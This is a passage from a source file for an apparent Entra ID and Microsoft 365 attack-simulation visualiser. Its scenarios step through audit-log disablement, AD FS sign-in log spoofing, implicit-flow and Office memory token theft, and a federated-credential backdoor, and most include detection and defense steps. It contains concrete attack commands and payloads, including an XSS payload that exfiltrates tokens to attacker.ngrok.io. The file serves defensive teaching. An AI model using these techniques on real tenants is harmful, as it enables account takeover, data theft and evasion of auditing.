    logMessage: "Attacker: GET https://graph.microsoft.com/v1.0/users (User.Read.All) → 340 users. For each: GET /users/{id}/messages?$select=subject,body,from,receivedDateTime&$top=50 (Mail.Read application permission). Full tenant email stream read — no individual tokens needed.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "mail exfil (all 340 users)"),
  },
  {
    logMessage: "Attacker's refresh_tokens (delegated, per-user): silently renewed every 90 days. Password changes do NOT invalidate refresh_tokens (only explicit token revocation does). 47 individual users' tokens active + admin consent app token for all users = full persistent coverage.",
    logType: "attack",
    action: () => { highlightElement("ent_user1"); highlightElement("ent_user2"); },
  },
  {
    logMessage: "REMEDIATION: Restrict user consent via Entra consent settings (App consent policies → allow only verified publisher + low-risk permissions). Admin consent workflow: requires ticket approval. Revocation: Entra portal → Enterprise Applications → revoke all consent grants → delete app. Check: GET /v1.0/oauth2PermissionGrants and /v1.0/servicePrincipals/{id}/appRoleAssignments regularly.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Persistent, stealthy, password-independent access. No malware, no persistent agent — pure OAuth2 abuse. Admin consent elevates to all current AND future users added to tenant. App persists in Enterprise Applications until explicitly removed. Most frequent finding in Microsoft DART cloud incident response engagements.",
    logType: "attack",
    action: () => highlightElement("ent_svc"),
  },
];

// ── 13. Unified Audit Log Disablement ────────────────────────────
export const entraUnifiedAuditLogDisableScenario = [
  {
    scenarioName: "Attack: Microsoft 365 Unified Audit Log Disablement",
    logMessage: "Attacker Goal: Use a compromised privileged Microsoft 365 session to stop Unified Audit Log ingestion, perform mailbox, SharePoint, OneDrive, eDiscovery, or Graph activity during the blind window, then re-enable auditing to reduce defender visibility.",
    logType: "attack",
    action: () => { highlightElement("ent_attacker"); highlightElement("ent_m365"); },
  },
  {
    logMessage: "Prerequisite note: the 'Compliance Administrator rights' prerequisite is incomplete. Microsoft documents that the actor must hold the Exchange Online Audit Logs role to toggle auditing; Global Admin can also disable auditing for the organization.",
    logType: "info",
    action: () => highlightElement("ent_admin", stepDelay, "compromised"),
  },
  {
    logMessage: "Starting point: attacker compromises an admin account that is in an Exchange Online role group containing Audit Logs, such as Organization Management or Compliance Management, or holds Global Administrator. The attacker already has MFA/session control; this scenario is post-compromise defense evasion, not initial access.",
    logType: "setup",
    action: () => highlightElement("ent_admin", undefined, "compromised"),
  },
  {
    logMessage: "Attacker connects to Exchange Online PowerShell, not Microsoft Graph: Connect-ExchangeOnline -UserPrincipalName admin@corp.onmicrosoft.com. Older AADInternals wrappers may still automate token acquisition, but the supported administrative surface is Exchange Online PowerShell.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "EXO PowerShell auth"),
  },
  {
    logMessage: "Recon: Get-AdminAuditLogConfig | Format-List UnifiedAuditLogIngestionEnabled. True means Microsoft 365 audit ingestion is enabled. Important 2026 gotcha: run this in Exchange Online PowerShell; Microsoft documents that the same property in Security & Compliance PowerShell always returns False even when auditing is enabled.",
    logType: "info",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "http", "Get audit config"),
  },
  {
    logMessage: "Disable ingestion: Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $false. Microsoft documents that the change can take up to 60 minutes to take effect. During the effective disabled window, Purview audit search, Search-UnifiedAuditLog, Microsoft Sentinel ingestion, and the Office 365 Management Activity API return no audit results for the organization.",
    logType: "attack",
    action: () => { highlightElement("ent_m365", stepDelay, "compromised"); addTemporaryEdge("ent_attacker", "ent_m365", "http", "Disable UAL ingestion"); },
  },
  {
    logMessage: "Blind-window activity: attacker reads mail, downloads OneDrive/SharePoint files, runs eDiscovery/content searches, or uses Graph against M365 data. The absence of Unified Audit Log results does not prove nothing happened; it may indicate tenant-level ingestion was disabled.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "M365 activity during gap"),
  },
  {
    logMessage: "Re-enable: Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $true. The attacker may wait, verify with Get-AdminAuditLogConfig, then leave the tenant looking normal. New audit data is retained according to license and audit retention policy; disabling ingestion does not retroactively create records for activity that was not ingested.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "http", "Re-enable UAL"),
  },
  {
    logMessage: "Detection: Microsoft documents that changes to auditing status are themselves audited. Search Exchange admin audit records for Operation=Set-AdminAuditLogConfig and inspect AuditData.UnifiedAuditLogIngestionEnabled, actor, timestamp, and source IP. Treat any unexpected False transition as high severity.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Defense: tightly restrict the Exchange Online Audit Logs role and Global Admin, require PIM approval for privileged role activation, alert on Set-AdminAuditLogConfig, export audit status-change events to an external SIEM, and investigate surrounding sign-ins, token use, mailbox access, eDiscovery, SharePoint, OneDrive, and Graph activity around the disabled interval.",
    logType: "info",
    action: () => highlightElement("ent_admin"),
  },
  {
    logMessage: "IMPACT: A single compromised audit-capable admin can create a tenant-wide M365 visibility gap. The strongest evidence may be the status-change record itself plus surrounding sign-in and admin telemetry, so defenders should monitor audit-state changes as a critical control, not as routine configuration noise.",
    logType: "attack",
    action: () => { highlightElement("ent_tenant"); highlightElement("ent_m365"); highlightElement("ent_attacker"); },
  },
];

// ── 13b. AD FS Connect Health Sign-in Log Spoofing ───────────────
export const entraAdfsConnectHealthLogSpoofScenario = [
  {
    scenarioName: "Attack: AD FS Connect Health Sign-in Log Spoofing",
    logMessage: "Attacker Goal: Abuse a compromised AD FS server that has Microsoft Entra Connect Health installed to inject fake AD FS sign-in records into Microsoft Entra sign-in reporting, flooding defenders with false users, IP addresses, timestamps, and request patterns.",
    logType: "attack",
    action: () => { highlightElement("ent_attacker"); highlightElement("ent_tenant"); },
  },
  {
    logMessage: "Microsoft still documents AD FS sign-ins in the Entra sign-ins report through Connect Health. The agent correlates AD FS Security log events into the Entra sign-in report schema, with optional ADFSSignIns export to Log Analytics and Azure Monitor workbooks.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Scope correction: normal Entra sign-in logs are system-generated and cannot be changed or deleted. This attack does not edit native cloud sign-ins. It abuses the AD FS Connect Health ingestion path to create synthetic AD FS sign-in rows that appear beside real sign-ins.",
    logType: "info",
    action: () => highlightElement("ent_m365"),
  },
  {
    logMessage: "Prerequisite: attacker has local admin or SYSTEM on an AD FS server or Web Application Proxy with the Connect Health agent installed. The tenant must use Microsoft Entra ID P1/P2 for Connect Health visibility, and AD FS auditing must be enabled so the feature normally has source events.",
    logType: "setup",
    action: () => highlightElement("ent_admin", stepDelay, "compromised"),
  },
  {
    logMessage: "Agent secret theft: the attacker reads Connect Health agent material from the host, including AgentKey, TenantId, ServiceId, ServiceMemberId, and MachineId. Tools such as AADInternals expose this as Get-AADIntHybridHealthServiceAgentInfo; the underlying secret is local machine-protected material used by the agent.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "http", "Steal agent info"),
  },
  {
    logMessage: "Normal source trail: a real AD FS sign-in writes AD FS Auditing events to the Windows Security log, including Event ID 1200 for token issuance at the basic audit level and richer verbose events such as 299, 403, 500, and 501. Connect Health later reads and uploads those events.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Spoof event creation: attacker constructs arbitrary AD FS event payloads: UPN='henry@corp.com', IPAddress='8.8.8.8', NetworkLocationType='Extranet', Timestamp='2026-04-29T10:15:00Z', Server='ADFS01'. No matching Event ID 1200 is written locally because no real authentication occurred.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Upload path: using the stolen agent identity, the attacker requests a Connect Health service access token, retrieves a Blob upload key and Event Hub publisher key, uploads compressed fake events to Azure Blob storage, then sends the signed notification that triggers processing.",
    logType: "http",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "http", "Fake ADFS events"),
  },
  {
    logMessage: "Defender view: after ingestion delay, the Entra sign-in report shows AD FS-origin sign-ins for the fake users and IP addresses. For WS-Fed or WS-Trust style entries, Application ID / Name may show NotSet or NotApplicable, while Resource ID or relying-party identifiers carry the federation resource context.",
    logType: "success",
    action: () => addTemporaryEdge("ent_m365", "ent_tenant", "oidc", "Spoofed sign-in rows"),
  },
  {
    logMessage: "Current limitation: Secureworks reported that Microsoft mitigated the 2021 overwrite/tamper vector by assigning random Request IDs for AD FS sign-in events. Model this scenario as log pollution and false-IOC injection, not reliable modification of existing native cloud sign-in rows.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Detection: correlate Entra AD FS sign-in rows with on-prem AD FS Security logs. A spoofed cloud row has no matching AD FS audit event with the same time, server, UPN, IP chain, and correlation context. Also alert on local registry/DPAPI access to ADHealthAgent material, unexpected PowerShell module loads, and outbound Connect Health traffic from non-agent processes.",
    logType: "info",
    action: () => highlightElement("ent_admin"),
  },
  {
    logMessage: "Defense: treat AD FS and WAP servers as Tier 0, monitor and restrict local admin, enable endpoint detection on AD FS hosts, collect AD FS Security logs independently, compare ADFSSignIns against source Windows events, keep Connect Health agents current, and migrate away from AD FS where cloud-native authentication removes the ingestion trust path.",
    logType: "info",
    action: () => highlightElement("ent_admin"),
  },
  {
    logMessage: "IMPACT: A compromised AD FS/Connect Health host can poison the defender's identity timeline with synthetic AD FS sign-ins. The attacker cannot erase every independent source of truth, but can create enough plausible noise to slow incident response unless cloud sign-ins are correlated with on-prem AD FS audit telemetry.",
    logType: "attack",
    action: () => { highlightElement("ent_tenant"); highlightElement("ent_m365"); highlightElement("ent_attacker"); },
  },
];

// ── 13c. Fake Hybrid Health Agent Registration for Log Injection ──
export const entraFakeHealthAgentScenario = [
  {
    scenarioName: "Attack: Fake Connect Health Agent Registration — Log Injection via Global Admin",
    logMessage: "Attacker Goal: Register a completely new, attacker-controlled Microsoft Entra Connect Health agent using a compromised Global Administrator account. No existing AD FS server or Connect Health installation required. The fake agent reports as Healthy and can inject arbitrary sign-in log entries into the Entra sign-in report.",
    logType: "attack",
    action: () => { highlightElement("ent_attacker"); highlightElement("ent_tenant"); },
  },
  {
    logMessage: "Key distinction from Connect Health credential theft (13b): this attack creates a brand-new hybrid health service and agent from scratch. The attacker does not need local admin on any AD FS or WAP server — only a Global Administrator token. Tenants that do not run AD FS at all are still vulnerable if Global Admin is compromised.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Prerequisite: Global Administrator (or Hybrid Identity Administrator) account. Tenant requires at least one Entra ID P1/P2 license for spoofed events to surface in the sign-in report. Without P1/P2, agents can still be registered and events submitted, but they do not appear in the Microsoft Entra sign-in logs, limiting the attacker's noise-injection impact.",
    logType: "setup",
    action: () => highlightElement("ent_admin", stepDelay, "compromised"),
  },
  {
    logMessage: "Step 1 — Acquire GA token: attacker authenticates to Entra ID with the compromised GA account and retrieves an access token targeting the Hybrid Health service endpoint (https://s1.adhybridhealth.azure.com/). AADInternals: Get-AADIntAccessTokenForAADGraph -SaveToCache. Token can also be obtained by passing a stolen access token directly, bypassing interactive login.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "GA token → adhybridhealth"),
  },
  {
    logMessage: "Step 2 — Create fake health service: New-AADIntHybridHealthService -DisplayName 'corp.onmicrosoft.com'. The API call POSTs to the Hybrid Health management endpoint and provisions a new ADFederationService object in the tenant. The service ID returned is used in subsequent registration calls. The portal immediately shows the new service as 'Unmonitored'.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "http", "POST — new health service"),
  },
  {
    logMessage: "Step 3 — Register fake agent: Register-AADIntHybridHealthServiceAgent -ServiceName 'ADFederationService.corp.onmicrosoft.com' -MachineName 'srv-adfs01' -MachineRole 'ADFS Server 2016'. The machine name and role are arbitrary strings — attacker matches the victim's naming convention. The call generates an RSA key pair, requests a client certificate from the Health service CA, and writes AgentKey + TenantId + ServiceMemberId to a local JSON file.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "http", "Agent certificate issuance"),
  },
  {
    logMessage: "Portal state after registration: the agent appears as Healthy in the Entra Connect Health portal with the attacker-supplied hostname. Any administrator viewing the portal sees what looks like a legitimate federation server reporting in. Audit trail: agent registration events are NOT written to the Entra Audit Log — there is no built-in alert for a new health agent appearing.",
    logType: "success",
    action: () => highlightElement("ent_m365"),
  },
  {
    logMessage: "Step 4 — Inject fake sign-in events: attacker reads the agent JSON ($agentInfo = Get-Content agentInfo.json | ConvertFrom-Json), constructs arbitrary sign-in event payloads (UPN, IP address, timestamp, network location, auth result), then calls Send-AADIntHybridHealthServiceEvents. The request authenticates using the issued agent certificate and delivers events to the Azure Service Bus / Blob ingestion pipeline. Events appear in the Entra sign-in report within 30–60 minutes.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "http", "Fake sign-in events → ingestion pipeline"),
  },
  {
    logMessage: "Injected sign-in appearance: spoofed rows surface in the Microsoft Entra sign-in report under the fabricated user, IP, and timestamp. Application ID and Name show as NotApplicable or NotSet for WS-Fed/WS-Trust style entries; Resource ID carries urn:federation:MicrosoftOnline. These rows are indistinguishable from real AD FS sign-ins unless correlated with on-prem source events.",
    logType: "success",
    action: () => addTemporaryEdge("ent_m365", "ent_tenant", "oidc", "Spoofed AD FS sign-in rows"),
  },
  {
    logMessage: "Step 5 — Cleanup: Remove-AADIntHybridHealthService -ServiceName 'ADFederationService.corp.onmicrosoft.com'. Removes the fake agent and service from the portal immediately. No audit log entry is generated for removal either. The injected sign-in rows persist in the Entra sign-in report for the standard 30-day retention window regardless of agent removal.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Detection gaps: no Entra audit log event for new health service creation or agent registration. No alert on certificate issuance from the Health service CA. Injected sign-in rows have no matching AD FS Security log event (Event ID 1200) on any real server because the 'federation server' is a phantom machine name. If the tenant has no AD FS deployment at all, any AD FS-origin sign-in rows are inherently anomalous.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Detection: (1) Periodically audit the Entra Connect Health portal for unexpected health agents — especially if the tenant does not operate AD FS. (2) Correlate Entra AD FS sign-in rows with on-prem AD FS Security logs; a row with no matching Event ID 1200 on any real ADFS host is synthetic. (3) Alert on GA-level PowerShell sessions that load AADInternals or issue requests to adhybridhealth.azure.com. (4) Monitor PIM/audit logs for Global Administrator activations outside change-window hours.",
    logType: "info",
    action: () => highlightElement("ent_admin"),
  },
  {
    logMessage: "Defense: (1) Minimize active Global Administrator accounts; use PIM with approval workflow and short activation windows — this attack requires a live GA token. (2) If the tenant does not use AD FS, disable or remove the Connect Health service entirely and alert on any re-creation. (3) Export Entra sign-in logs to SIEM and build a rule: AD FS-origin sign-in rows where the reported server hostname does not match any known ADFS server in your environment. (4) Migrate from AD FS to cloud-native authentication (Entra ID PHS or PTA with Seamless SSO) to eliminate the Connect Health ingestion trust path entirely.",
    logType: "info",
    action: () => highlightElement("ent_admin"),
  },
  {
    logMessage: "IMPACT: A compromised Global Administrator — with no foothold on any on-premises server — can fabricate an entire AD FS reporting infrastructure in the Entra portal and inject arbitrary sign-in history. Defenders relying on Entra sign-in logs as a sole source of truth for federation activity cannot distinguish real from injected entries without independent on-prem AD FS telemetry or the knowledge that no federation server exists.",
    logType: "attack",
    action: () => { highlightElement("ent_attacker"); highlightElement("ent_tenant"); highlightElement("ent_m365"); },
  },
];

// ══════════════════════════════════════════════════════════════════
//  TOKEN & SESSION — IMPLICIT FLOW TOKEN HARVEST
// ══════════════════════════════════════════════════════════════════

// ── 14. OAuth2 Implicit Flow — Access Token Harvest via URL Fragment ──────────
export const entraImplicitTokenHarvestScenario = [
  {
    scenarioName: "Attack: OAuth2 Implicit Flow — Access Token Harvest (URL Fragment / XSS / Referrer)",
    logMessage: "Attacker Goal: Extract Entra ID access tokens from legacy SPA applications using the deprecated OAuth2 implicit grant flow. Tokens returned in the URL fragment (#access_token=...) — exposed to browser history, referrer headers, and any JavaScript executing in the page.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Identify target SPA: corp-portal.corp.com. App registration recon: GET /v1.0/applications/{appId}?$select=web → web.implicitGrantSettings.enableAccessTokenIssuance=true. Implicit flow enabled — tokens returned in URL fragment rather than via secure back-channel POST /token.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "app implicit grant check"),
  },
  {
    logMessage: "Alice authenticates normally to corp-portal: GET https://login.microsoftonline.com/.../authorize?response_type=token+id_token&scope=openid+Mail.Read&redirect_uri=https://corp-portal.corp.com/auth/callback. Completes password + MFA. Entra redirects.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_dev1", "ent_tenant", "oidc", "GET /authorize (implicit)"),
  },
  {
    logMessage: "Entra ID → Browser: HTTP 302 Location: https://corp-portal.corp.com/auth/callback#access_token=eyJ0eXAiOiJKV1Q...&token_type=Bearer&expires_in=3600&scope=Mail.Read&id_token=eyJ0eXA.... Token is in the URL FRAGMENT — browser stores full URL in history. Fragment sent to page JavaScript via window.location.hash, never transmitted to server.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_dev1", "oidc", "302 → #access_token"),
  },
  {
    logMessage: "Attack Vector A — Browser History Extraction: Malware/LotL reads browser history SQLite DB (e.g., %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History). SQL: SELECT url FROM urls WHERE url LIKE '%access_token%'. Recovers full URL with JWT. Token valid 1h from issuance.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attack Vector B — Referrer Header Leak: corp-portal.corp.com includes Google Analytics (<script src='https://www.googletagmanager.com/...'/>). Browser includes Referer: https://corp-portal.corp.com/auth/callback#access_token=eyJ0... header in request to GTM CDN. Access token sent in cleartext to third-party analytics.",
    logType: "http",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attack Vector C — XSS Token Exfil: Stored XSS in corp-portal comment field. Payload: <img src=x onerror=\"fetch('https://attacker.ngrok.io/?t='+encodeURIComponent(window.location.hash+sessionStorage.getItem('msal.token')))\">. Captures both URL fragment token AND any MSAL-cached tokens from sessionStorage.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_dev1", "http", "XSS → hash + storage exfil"),
  },
  {
    logMessage: "Attacker replays stolen access_token: GET https://graph.microsoft.com/v1.0/me/messages (Authorization: Bearer <stolen_AT>). MS Graph: validates JWT — aud=graph.microsoft.com ✓, scp=Mail.Read ✓, exp not reached ✓. Returns Alice's inbox. 1h window: sufficient for email exfil + directory recon.",
    logType: "msgraph",
    action: () => { addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "GET /me/messages (stolen)"); highlightElement("ent_user1", undefined, "compromised"); },
  },
  {
    logMessage: "Key constraint: implicit flow does NOT issue refresh_tokens (RFC 6749 §4.2, by design). Attacker has 1h window per token. However: re-triggering the authorize endpoint with prompt=none silently issues new access_token if session cookie active. Attacker can loop prompt=none requests from iframe to harvest fresh tokens indefinitely.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "prompt=none silent re-auth"),
  },
  {
    logMessage: "IMPACT: Implicit flow exposes access tokens to any JavaScript on the page, browser extensions, history, and referrer-receiving third parties — the attack surface is every line of JavaScript and every HTTP link. MSAL.js v2+ (auth code + PKCE) eliminates this by issuing tokens via back-channel POST only. Mitigation: disable enableAccessTokenIssuance in app registration, migrate to MSAL.js 2.x PKCE flow. Entra now warns in portal when implicit flow is enabled.",
    logType: "attack",
    action: () => highlightElement("ent_dev1"),
  },
];

// ── 14b. Office 365 App Memory Token Harvest ─────────────────────
export const entraOfficeTokenHarvestScenario = [
  {
    scenarioName: "Attack: Office 365 App Memory Token Harvest (Process Dump → Graph API Bypass MFA)",
    logMessage: "Attacker Goal: On a compromised Windows workstation, dump the memory of any running Microsoft 365 app (Excel, Teams, Outlook, Word) and extract cached JWT access tokens. Replay them against Graph API or Outlook REST API — the token already satisfies MFA, no password required.",
    logType: "attack",
    action: () => { highlightElement("ent_attacker"); highlightElement("ent_dev2"); },
  },
  {
    logMessage: "Prerequisite: Code execution on victim workstation (LAPTOP-02) as the logged-in user or local admin. Victim (Bob) has M365 apps installed and is actively signed in — verified by 'File → Account' in any Office app showing the user's name and tenant. MFA is enabled on Bob's account.",
    logType: "setup",
    action: () => { highlightElement("ent_dev2", undefined, "compromised"); highlightElement("ent_user2"); },
  },
  {
    logMessage: "Target process selection: any running M365 app holds cached tokens. Teams, Outlook, and Excel are highest yield. Verify: Get-Process | Where-Object { $_.Name -match 'EXCEL|Teams|OUTLOOK|WINWORD|POWERPNT' }. Pick any with non-zero WorkingSet64.",
    logType: "attack",
    action: () => highlightElement("ent_dev2"),
  },
  {
    logMessage: "Method 1 — Process dump via Sysinternals procdump: procdump.exe -ma EXCEL.EXE %TEMP%\\excel.dmp. Requires user context (same user) or local admin. Dump size: 200–600 MB typical. Can be exfiltrated — all extraction can happen on attacker machine.",
    logType: "attack",
    action: () => highlightElement("ent_dev2"),
  },
  {
    logMessage: "Method 2 — PowerShell inline dump (no tool drop): [void][System.Reflection.Assembly]::LoadWithPartialName('System.Diagnostics'); $p = Get-Process EXCEL; $ms = New-Object System.IO.MemoryStream; $p.Handle | Out-Null; [System.Runtime.InteropServices.Marshal]::... (MiniDumpWriteDump via P/Invoke). LOLBin-friendly, no sysinternals binary needed.",
    logType: "attack",
    action: () => highlightElement("ent_dev2"),
  },
  {
    logMessage: "Token extraction from dump: strings.exe excel.dmp | Select-String 'eyJ0' > tokens.txt (Sysinternals strings). Or PowerShell: [System.IO.File]::ReadAllText('excel.dmp') -split '\\s+' | Where-Object { $_ -match '^eyJ0' } | Out-File tokens.txt. Output: dozens to hundreds of JWT candidates.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_dev2", "ent_attacker", "attack-flow", "Exfil dump / tokens.txt"),
  },
  {
    logMessage: "Token identification: decode each JWT (base64url decode the payload, second segment). Filter for aud claims: 'https://graph.microsoft.com' (Graph), 'https://outlook.office365.com' (OWA REST API), 'https://management.azure.com' (ARM). Graph tokens are highest value — broad API surface. Check exp claim: discard expired tokens.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Scope inspection: decode scp claim. Typical M365 app scopes include: User.Read, Mail.Read, Mail.ReadWrite, Mail.Send, Calendars.ReadWrite, Files.ReadWrite, Contacts.Read, Team.ReadBasic.All, Chat.Read. Graph token with Mail.Send is sufficient for BEC pivot without any further authentication.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Replay — MFA bypass: curl -s -H 'Authorization: Bearer <graph_token>' https://graph.microsoft.com/v1.0/me/messages?$top=10. Returns Bob's inbox. The token carries an mfa_auth_time claim — Entra already recorded MFA was satisfied when Bob originally signed in. Replaying the token is indistinguishable from the legitimate app's requests.",
    logType: "msgraph",
    action: () => { addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "GET /me/messages (stolen token)"); highlightElement("ent_user2", undefined, "compromised"); },
  },
  {
    logMessage: "Further exploitation: enumerate tenant users (GET /v1.0/users), send phishing email as Bob (POST /v1.0/me/sendMail), access OneDrive (GET /v1.0/me/drive/root/children), read Teams chats (GET /v1.0/me/chats). Scope of damage is the full scp set — no password, no MFA interaction.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "User.Read, Mail.Send, etc."),
  },
  {
    logMessage: "Alternative — MSAL disk cache: DPAPI-protected token caches at %LOCALAPPDATA%\\Microsoft\\OneAuth\\, %LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\, and app-specific DPAPI blobs. With user context (no admin needed), CryptUnprotectData() decrypts the cache and yields refresh_tokens — longer-lived than access_tokens.",
    logType: "attack",
    action: () => highlightElement("ent_dev2"),
  },
  {
    logMessage: "DETECTION: MDE alert 'Credential dumping from Microsoft 365 apps' fires on Office process memory dumps. Entra sign-in logs: access_token replay from a new IP/ASN while the user's device is still active at the original location. UEBA baseline drift on API call patterns (new methods, unusual hours). Mitigate: CAE for supported apps invalidates stolen tokens on session revoke; MDE ASR rule blocking Office memory reads.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Silent, MFA-bypassing credential theft from any machine running M365. Attacker needs only code execution as the user (not even admin) and a short window before the token expires (~1h access_token; up to 90 days via refresh_token from DPAPI cache). Output feeds BEC, data exfil, lateral movement via Graph API.",
    logType: "attack",
    action: () => { highlightElement("ent_user2"); highlightElement("ent_m365"); },
  },
];

// ══════════════════════════════════════════════════════════════════
//  PRIVILEGE ESCALATION — WORKLOAD IDENTITY FEDERATION ABUSE
// ══════════════════════════════════════════════════════════════════

// ── 15. Workload Identity Federation Abuse (OIDC Federated Credential Backdoor) ─
export const entraWIFAbuseScenario = [
  {
    scenarioName: "Attack: Workload Identity Federation Abuse — Secretless Persistent Backdoor via External OIDC",
    logMessage: "Attacker Goal: Add an OIDC federated identity credential to a high-privilege app registration. An attacker-controlled external OIDC provider (GitHub Actions) can then exchange its tokens for Entra SP tokens — no client secret required, no credential to scan or rotate.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker holds Application Administrator session (or is Owner of AppReg-01). Target: AppReg-01 has Application Permission RoleManagement.ReadWrite.Directory — direct Global Admin escalation primitive. WIF allows external OIDC IdPs to vouch for app identity without a stored secret.",
    logType: "setup",
    action: () => { highlightElement("ent_admin", undefined, "compromised"); highlightElement("ent_svc"); },
  },
  {
    logMessage: "Attacker creates GitHub repo: github.com/attacker-org/infra-sync (private). GitHub's OIDC provider issues JWTs per workflow run: iss=https://token.actions.githubusercontent.com, sub=repo:attacker-org/infra-sync:ref:refs/heads/main, aud=<configurable>. Token signed with GitHub's OIDC keys (JWKS published publicly).",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker → MS Graph (as App Admin): POST /v1.0/applications/{AppReg01_objectId}/federatedIdentityCredentials { name: 'github-infra-sync', issuer: 'https://token.actions.githubusercontent.com', subject: 'repo:attacker-org/infra-sync:ref:refs/heads/main', audiences: ['api://AzureADTokenExchange'] }. Returns 201 Created.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST /federatedIdentityCredentials"),
  },
  {
    logMessage: "Audit event written: 'Update application — Add federated identity credential'. No client_secret created. No password. Credential scanners (GitLeaks, TruffleHog, Defender CSPM) find no secrets to alert on — FIC is a trust relationship, not a credential string. Zero byte secret footprint.",
    logType: "attack",
    action: () => highlightElement("ent_svc", undefined, "compromised"),
  },
  {
    logMessage: "Attacker triggers GitHub Actions workflow (github.com/attacker-org/infra-sync/.github/workflows/sync.yml, permissions: id-token: write). GitHub OIDC issues signed JWT to workflow environment: {iss, sub=repo:attacker-org/infra-sync:ref:refs/heads/main, aud=api://AzureADTokenExchange, jti}.",
    logType: "oidc",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "GitHub Action → Entra ID: POST /oauth2/v2.0/token { client_id: <AppReg01_appId>, client_assertion_type: urn:ietf:params:oauth:client-assertion-type:jwt-bearer, client_assertion: <GitHub_OIDC_JWT>, grant_type: client_credentials, scope: https://graph.microsoft.com/.default }.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "WIF token exchange (GitHub→Entra)"),
  },
  {
    logMessage: "Entra ID WIF validation: fetches GitHub's public JWKS (https://token.actions.githubusercontent.com/.well-known/openid-configuration → jwks_uri). Validates JWT signature, issuer, subject, audience against registered FIC entry. All match → issues access_token for AppReg-01 SP.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "SP access_token (roles: RoleManagement.RW)"),
  },
  {
    logMessage: "Attacker (via GitHub Actions scheduled cron: '0 */6 * * *'): POST /v1.0/roleManagement/directory/roleAssignments { principalId: <attacker_SP>, roleDefinitionId: '62e90394-...' (GlobalAdministrator) }. GA assigned every 6h. If removed by defenders, workflow re-assigns within 6h automatically.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST /roleAssignments (GA, cron)"),
  },
  {
    logMessage: "DETECTION: Entra Audit Log shows 'Add federated identity credential' at creation — one event, easy to miss. Subsequent WIF token issuances appear as normal SP auth events. FIC not visible in 'Certificates & secrets' portal blade — requires navigating to 'Federated credentials' tab or GET /applications/{id}/federatedIdentityCredentials. Defender for Cloud Apps App Governance: alert on 'New federated credential added to privileged app'.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Secretless, rotation-proof, scanner-invisible, self-healing persistent backdoor. Removes a GitHub repo's authentication cost (no secrets to protect). Persists through: client secret rotation, certificate rotation, password changes, MFA resets. Removal requires finding and deleting the FIC entry specifically. Increasingly used by nation-state actors as post-compromise persistence on cloud-native workloads.",
    logType: "attack",
    action: () => { highlightElement("ent_svc"); highlightElement("ent_tenant"); },
  },
];

// ── 15b. Azure Automation Account — Credential Asset Extraction via Runbook ──
export const entraAutomationCredExfilScenario = [
  {
    scenarioName: "Attack: Azure Automation Account — Credential Asset Extraction via Runbook",
    logMessage: "Attacker Goal: Automation Accounts store credentials as encrypted assets visible in the portal but unreadable there. A principal with Automation Contributor (or Owner/Contributor on the resource group) can create a PowerShell runbook that calls Get-AutomationPSCredential, extracts plaintext passwords at runtime, and prints them to job output.",
    logType: "attack",
    action: () => { highlightElement("ent_attacker"); highlightElement("ent_mi"); },
  },
  {
